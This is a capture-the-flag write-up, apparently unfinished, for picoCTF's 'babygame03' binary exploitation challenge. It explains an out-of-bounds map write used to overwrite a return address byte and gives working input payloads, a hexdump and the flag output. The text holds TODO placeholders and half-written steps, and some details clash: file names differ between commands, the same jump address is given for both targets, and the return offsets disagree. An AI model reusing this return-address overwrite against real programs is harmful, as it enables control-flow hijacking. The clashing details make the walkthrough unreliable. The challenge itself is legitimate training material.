# babygame03 #

**THIS WRITE UP IS STILL IN PROGRESS**
It requires clean up and may not yet be fully complete. I'm still working on it.
 
## Overview ##

400 points
 
Category: [Binary Exploitation](../)

Tags : `#binaryexploitation #writewhatwhere #bufferunderflow #returnaddress #outofbounds #integermath`
 
## Description ##
 
Break the game and get the flag.

Welcome to BabyGame 03! Navigate around the map and see what you can find! Be careful, you don't have many moves. There are obstacles that instantly end the game on collision. The game is available to download. There is no source available, so you'll have to figure your way around the map.

## Approach ##

This challenge is a variant of [babygame01](https://github.com/snwau/picoCTF-2023-Writeup/blob/main/Binary%20Exploitation/babygame01/babygame01.md) and [babygame02](https://github.com/snwau/picoCTF-2023-Writeup/blob/main/Binary%20Exploitation/babygame02/babygame02.md) from [picoCTF 2023](https://github.com/snwau/picoCTF-2023-Writeup), building upon those challenges. It's worth getting familair with these if you haven't already, as there is some reusing of knowledge and techniques when attacking this challenge.

Running the game, we see `babygame03` now limits the number of moves when can make and adds a level mechanism to the game, which forms one of our primary win conditions (more on that later).

Analysis began by disassembling the `game` binary within [Ghidra](https://ghidra-sre.org) and searching for any occurances of the "flag" string. That quickly brought us to a `win()` function that opens a `flag.txt` file, reads its contents and displays it, but only the `param_1` parameter passed to `win()` is equal to 5, otherwise nothing is displayed. This parameter was later deterined to be the current level of the game, local variable `curr_level` in `main()`.

    void win(int *param_1)
    {
      char local_4c [60];   /* buffer for flag file contents */
      FILE *local_10;       /* flag file handle */
      
      local_10 = fopen("flag.txt","r");
      if (local_10 == (FILE *)0x0) {
        puts("Please create \'flag.txt\' in this directory with your own debugging flag.");
        fflush(stdout);
        exit(0);
      }
      fgets(local_4c,0x3c,local_10);
      if (*param_1 == 5) {
        /* WIN CONDITION! */
        printf(local_4c);
        fflush(stdout);
      }
      return;
    }

Viewing references to the `win()` function, we can see that it's called only once, from the end of the `main()` function (shown below), after the `do-while` loop and prior leaving `main()`.

After some analysis of the diassembled C code and renaming important variables to better describe their purpose after they have been gleened, we can piece together our win conditions.

    undefined4 main(void)
    {
      int iVar1;
      int curr_level;
      int player;
      int player_x_pos;
      undefined map_buf [2700];
      char move_cmd_input;
      int local_14;
      undefined *local_10;

      local_10 = &stack0x00000004;
      init_player(&player);
      curr_level = 1;
      local_14 = 0;
      init_map(map_buf,&player,&curr_level);
      print_map(map_buf,&player,&curr_level);
      signal(2,sigint_handler);
      do {
        iVar1 = getchar();
        move_cmd_input = (char)iVar1;
        move_player(&player, (int)move_cmd_input, map_buf, &curr_level);
        print_map(map_buf, &player, &curr_level);
        /* LEVEL WIN CONDITION: player is at {X,Y} = {89, 29} *AND* 
           we are currently not at Level #4 */
        if (((player == 0x1d) && (player_x_pos == 0x59)) && (curr_level != 4)) {
          puts("You win!\n Next level starting ");
          local_14 = local_14 + 1;
          curr_level = curr_level + 1;
          init_player(&player);
          init_map(map_buf,&player,&curr_level);
        }
        /* GAME WIN CONDITION: player is at {X,Y} = {89, 29} *AND* 
           current level is #5 *AND* local_14 is 4 */
      } while (((player != 0x1d) || (player_x_pos != 0x59)) || 
               ((curr_level != 5 || (local_14 != 4))));
      win(&curr_level);
      return 0;
    }

The `init_map()` and `print_map()` functions give us the purpose of a number of the local variables that are passed by reference to these functions. I've named one of these local variables `player` is used by these functions as a `struct` in the form:

    struct player
    { 
      int y_pos;       /* player[0] */
      int x_pos;       /* player[1] */
      int num_lives;   /* player[2] */
    }

So putting together our win condition..

- Win the current level by reaching the opponent at `{X,Y}` position of `{89,29}` on the map.
- Reach Level #5 in the game, to satisfy `win()` condition and display the flag.

But there are a few traps (that you may have already spotted) that prevent these deceptively simple win conditions from being met so easily:

- Firstly, `player.num_lives` is set to `50` within `init_player()` and reset at each level. `init_player()` also positions us at `{X,Y}` of `{4,4}`, meaning it will take mode than `50` moves to get to our opponent at `{X,Y}` of `{89,29}` to even be able to win a level.
- The `(curr_level != 4)` condition in the level win conditions prevents execution of the level win logic if we are currently on Level `#4`, so we can't progress to Level `#5` which is needed by the game win conditions.
- As well as the `curr_level` variable there is also another "guard" variable that is used by the game win condition logic, the name of which is left as the default variable name from dissassembly, `local_14`, which gets incremented in conjuction with `curr_level` as part of level winning logic.

Analysing `move_player()` function we can see that it exhibits the same behaviour as [babygame02](https://github.com/snwau/picoCTF-2023-Writeup/blob/main/Binary%20Exploitation/babygame02/babygame02.md), with the exploitable `map_buf` array indexing based off the user controller player position in `{X,Y}` coordinates, that is not bounds checked (can be negative), to form a "Write-What-Where" primative by manipulating the player position to construct the under/overlow we require. Refer to the previous `babygame` write ups for a more detailed description how this is exploited.

The other difficulty is that this version of `move_player()` also writes over the previous player position with a '`.`' `(0x2e)` character to clear the player position within the map buffer before the next move instruction is actioned. This prevents us stimply from exploiting the "Write-What-Where" to write our target values in `curr_level` and `local_14` (values `5` and `4` respectively), as the first one will be rewritten with '`.`' `(0x2e)` character when we attempt to write the second.

    void move_player(int *player_ptr, char move_cmd_input, int map_buf, undefined4 curr_level_ptr)
    {
      int iVar1;
      
      if (player_ptr[2] < 1) {
        puts("No more lives left. Game over!");
        fflush(stdout);
        exit(0);
      }
      if (move_cmd_input == 'l') {
        iVar1 = getchar();
        player_tile = (undefined)iVar1;
      }
      if (move_cmd_input == 'p') {
        solve_round(map_buf,player_ptr,curr_level_ptr);
      }
      *(undefined *)(*player_ptr * 0x5a + map_buf + player_ptr[1]) = 0x2e;
      if (move_cmd_input == 'w') {
        *player_ptr = *player_ptr + -1;
      }
      else if (move_cmd_input == 's') {
        *player_ptr = *player_ptr + 1;
      }
      else if (move_cmd_input == 'a') {
        player_ptr[1] = player_ptr[1] + -1;
      }
      else if (move_cmd_input == 'd') {
        player_ptr[1] = player_ptr[1] + 1;
      }
      if (*(char *)(*player_ptr * 0x5a + map_buf + player_ptr[1]) == '#') {
        puts("You hit an obstacle!");
        fflush(stdout);
        exit(0);
      }
      *(undefined *)(*player_ptr * 0x5a + map_buf + player_ptr[1]) = player_tile;
      player_ptr[2] = player_ptr[2] + -1;
      return;
    }

The restriction of player lives can also be seen within `move_player()'`, ensuring the number of lives is greater than zero before attempting a move, otherwise exiting the game. The number of lives is decremented each time the player is moved before returning from the function.

### Plan of Attack : ###

1. Use the exploit to modify `player.num_lives` to give ourselves the freedom to move around effectively unhindered.
2. Solve the level (move our character to `{X,Y}` of `{89, 29}`) in the bottom right hand corner, to progress to the next level.
3. Repeat steps `#1` and `#2` until we reach Level `#4`.
4. This time after freeing up our movement (step `#1`) we change our approach and use the exploit again to patch our return address thats on the stack, such that when we return from the `move_player()` function call, we jump past the level win condition logic into level win code itself, bypassing the (`curr_level != 4`) check. At this point we have now met all of the level based win conditions.
5. Finally we perform another patching of the return address from `move_player()` to jump past the `do-while()` conditions, to execute `win()`.   

I spent way too long during the competition trying to figure out steps `#4` and `#5`, trying all sorts of complicated logic to meet all the carefully constructed level and game win conditions, when the answer finally came with the return-jumps.

### Attack Construction : ###

Constructing the attack piece by piece for the steps outlined above in our plan.

Firstly, inspection of the stack frame of `main()`, reconstructed for visualisation using both `gdb` and the Ghidra disassembly to find the layout of the local variables and hence target addresses/offsets for use in the exploit :

              (stack top - lower address)

    0xffffca??  |------------------| ($ESP - ?)
                |                  |
    0xffffcabc  | curr_level       | [$EBP - ?] int
    0xffffcac0  | player.y_pos     | [$EBP - 0xAA0]  int
    0xffffcac4  | player.x_pos     | [$EBP - 0xA9C]  int
    0xffffcac8  | player.num_lives | [$EBP - ?]  int
    0xffffcacc  | map_buf          | [$EBP - 0xA95]  char[2700] 
                .                  .
                .                  .
                .                  .



                | input_char       | [$EBP - 0x9]    char
    0xffffd530  | Saved $ECX       | [$EBP - 0x8]
    0xffffd534  | Saved $EBX       | [$EBP - 0x4]
    0xffffd538  | Previous $EBP    | <--- $EBP
                |------------------|
                |                  |
    ?????????????????????????????????????????????????????????????????????????

#### Step #1 : Increasing Lives (Moves) ####

To get around the movement restriction the exploit is used to modify the value of `player.num_lives`, remembering after writing a byte it will be cleared with the value of `0x2e` on the next move, so we want to right a higher order byte to give ourselves plenty of lives, such that it's no longer a factor.

Our target will be address `TODO`, an offset of `TODO` from the start of the `map_buf`. We want to write to a single targetted byte outside of `map_buf` to avoid unnecessary corruption, so we'll set out `X` position required to achieve the target offset with a `Y` position of `-1`.

Solving the `map_buf` array deferencing for `X`, given our target offset and `Y` position gives :

    TODO

....starting pos...So we'll move right to our target X position of , then move up to a Y value of -1, writing to `player.num_lives`..... `s` to clean up and bring our player position back to valid `map_buf` range.

    ...... remove ..... pipe
    $ echo -e $(python3 -c 'print(b"aaaaaaaaawwwws")') | ./game

    Player position: 0 85
    Level: 1
    End tile position: 29 89
    Lives left: 3014690


#### Step #2 : Solving the Level ####

Solving the level after freeing our movement is now trivial, using the movement commands discovered in `move_player()`, the `p` command calls the `solve_round()` function to automate the movement of our player character to the opponent end position.

#### Step #3 : Reaching Level 4 ####

To reach level `#4` we can simply repeat the process above process for Steps `#1` and `#2` another two times, simplied to:

TODO
    
    $ echo -e $(python3 -c 'print(b"aaaaaaaaawwwwsp"*3)') | ./game

    .... (snip) ....

    You win!
     Next level starting 

    .... (snip) ....

    Player position: 4 4
    Level: 4
    End tile position: 29 89
    Lives left: 49
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ....@.....................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    ..........................................................................................
    .........................................................................................X


#### Step #4 : Ret-Jump to Level #5 ####

The Ghidra diassembly was used to find a suitable target for the return jump from `move_player()`.

![Ghidra diassembly return jump target #1](./ghidra-babygame03-ret-jump-1.png)

There is a number of addresses we could use, as long as the difference in the original return address and our target was confined to a single byte change, the Least Significant Byte (LSB), due to the single byte restriction of the exploit. 

`0x080499fe` was the return address I targetted, to return straight into the "you win, next level" processing.

Now we need to find where the return address of `main()` is on the stack during the call to `move_player()`.
... ret addres
... break point
... stack dump

    08049926 50                 PUSH       EAX
    08049927 e8 07 fc ff ff     CALL       move_player
    0804992c 83 c4 10           ADD        ESP,0x10



    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0xffffca60│+0x0000: 0x80482cc  →  0x000035 ("5"?)  ← $esp
    0xffffca64│+0x0004: 0x804c000  →  0x804bf10  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
    0xffffca68│+0x0008: 0xffffd614  →  0xffffd75e  →  "/home/scottw/picoCTF/babygame03/game"
    0xffffca6c│+0x000c: 0xf7ffcb80  →  0x00000000
    0xffffca70│+0x0010: 0x804c000  →  0x804bf10  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
    0xffffca74│+0x0014: 0xffffd614  →  0xffffd75e  →  "/home/scottw/picoCTF/babygame03/game"
    0xffffca78│+0x0018: 0xffffd548  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000  ← $ebp
    0xffffca7c│+0x001c: 0x804992c  →  <main+187> add esp, 0x10



                (stack top - lower address)
    ???????????????????????????????????????????????????????????????????????????
                |                         |
    0xffffca78  | old EBP                 | <--- $EBP
                |-------------------------|
    0xffffca7c  | return address          |  = `main()+149` : 0x8049709
                |-------------------------|
    0xffffca80  | param1 - &player_y_pos  |
    0xffffca84  | param2 - input ch       |
    0xffffca88  | param3 - map_buf        |
                |-------------------------|
    0xffffca8c  |        ?                |
    0xffffca90  |-------------------------|    
    0xffffca90  | main() stack frame      |
                |                         |
    ???????????????????????????????????????????????????????????????????????????


    + b"d"*44 + b"wl\x7fw")


#### Step #5 : Ret-Jump to WIN ####

Now with the win condition all set for the successful dropping of the flag in `win()`, we just need to break out of the `do-while()` loop now in `main()`, which we achieve with another return-jump from `move_player()` to after all the `while()` condition logic, the address I targetted was `0x080499fe`.

![Ghidra diassembly return jump target #2](./ghidra-babygame03-ret-jump-2.png)

Using the same attack as Step #4 with the LSB of the target return address modified to our new target we have the following input :

    .............
    + b"d"*44 + b"wl\xfew"


## Solution ##

It may not be the most elegant of final solutions, but this is how the challenge was solved during the competition, and as the plan of attack was tested and verified in stages, before bringing it all together.

    # (steps #1 - #3) free our movement (increase lives) and solve the first three levels
    $ echo -e $(python3 -c 'print(b"aaaaaaaaawwwwsp"*3)') > part1.txt

    # (step #4) free our movement, then construct a return-jump from 
    # move_player() into the "you win, starting next level" logic.
    $ echo -e $(python3 -c 'print(b"aaaaaaaaawwwws" + b"d"*44 + b"wl\x7fw")') > part2.txt

    # (step #5) free our movement, then construct a return-jump from 
    # move_player() to win() instead of the while() conditional logic
    $ echo -e $(python3 -c 'print(b"aaaaaaaaawwwws" + b"d"*44 + b"wl\xfew")') > part3.txt

    # chain it all together to form the final input payload
    $ cat step1.txt step2.txt step3.txt > final.txt

The final input payload is as follows after concatenation of the parts:

    $ hd final.txt 
    00000000  62 27 61 61 61 61 61 61  61 61 61 77 77 77 77 73  |b'aaaaaaaaawwwws|
    00000010  70 61 61 61 61 61 61 61  61 61 77 77 77 77 73 70  |paaaaaaaaawwwwsp|
    00000020  61 61 61 61 61 61 61 61  61 77 77 77 77 73 70 27  |aaaaaaaaawwwwsp'|
    00000030  0a 62 27 61 61 61 61 61  61 61 61 61 77 77 77 77  |.b'aaaaaaaaawwww|
    00000040  73 64 64 64 64 64 64 64  64 64 64 64 64 64 64 64  |sddddddddddddddd|
    00000050  64 64 64 64 64 64 64 64  64 64 64 64 64 64 64 64  |dddddddddddddddd|
    00000060  64 64 64 64 64 64 64 64  64 64 64 64 64 77 6c 7f  |dddddddddddddwl.|
    00000070  77 27 0a 62 27 61 61 61  61 61 61 61 61 61 77 77  |w'.b'aaaaaaaaaww|
    00000080  77 77 73 64 64 64 64 64  64 64 64 64 64 64 64 64  |wwsddddddddddddd|
    00000090  64 64 64 64 64 64 64 64  64 64 64 64 64 64 64 64  |dddddddddddddddd|
    000000a0  64 64 64 64 64 64 64 64  64 64 64 64 64 64 64 77  |dddddddddddddddw|
    000000b0  6c fe 77 27 0a                                    |l.w'.|
    000000b5

Solving the challenge is just a matter of using the constructed final input payload as input to the game (obiously replacing the executable with the challenge server details provided).

    $ cat final.txt | ./game

    .... (snip - lots of game output) ....

    picoCTF{...........redacted.............}

Where the actual flag value has been redacted for the purposes of this write up.
